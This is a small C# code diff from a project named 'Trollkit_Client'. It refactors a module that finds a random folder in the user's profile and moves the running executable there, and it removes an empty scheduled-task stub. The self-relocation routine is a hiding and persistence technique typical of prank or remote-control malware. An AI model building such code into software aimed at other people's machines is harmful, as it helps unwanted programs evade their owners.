@@ -5,6 +5,7 @@ using System.IO;
 using System.Linq;
 using System.Text;
 using System.Threading.Tasks;
+using Trollkit_Library;
 
 namespace Trollkit_Client.Modules
 {
@@ -19,7 +20,7 @@ namespace Trollkit_Client.Modules
 		public string FindRandomFileLocation()
 		{
 			string filename = Process.GetCurrentProcess().MainModule.FileName;
-			Console.WriteLine(filename);
+			BConsole.WriteLine(filename);
 			string path = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
 			string[] dir = Directory.GetFileSystemEntries(path);
 
@@ -36,20 +37,17 @@ namespace Trollkit_Client.Modules
 			return fndPath;
 		}
 
-		public void moveFileToLocation(string destinationPath)
+		public string MoveFileToLocation(string destinationPath)
 		{
 			try {
 				File.Move(AppDomain.CurrentDomain.BaseDirectory + AppDomain.CurrentDomain.FriendlyName, destinationPath + "\\" + AppDomain.CurrentDomain.FriendlyName);
 			}
 			catch (IOException iox)
 			{
-				Console.WriteLine(iox.Message);
+				BConsole.WriteLine(iox.Message);
 			}
-		}
 
-		public void scheduleTask()
-		{
-
+			return destinationPath + "\\" + AppDomain.CurrentDomain.FriendlyName;
 		}
 	}
 }
